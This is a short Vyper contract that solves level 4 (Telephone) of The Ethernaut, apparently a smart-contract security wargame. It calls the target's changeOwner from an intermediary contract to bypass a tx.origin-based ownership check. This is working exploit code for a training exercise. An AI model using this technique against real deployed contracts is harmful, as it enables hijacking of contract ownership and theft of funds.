# pragma version 0.4.0
"""
@title A hack for level 4 (Telephone) of The Ethernaut
@license MIT
@author unluckyduke7
"""

interface Telephone:
	def changeOwner(owner: address): nonpayable


@external
def hack(instance: Telephone, owner: address):
	extcall instance.changeOwner(owner)
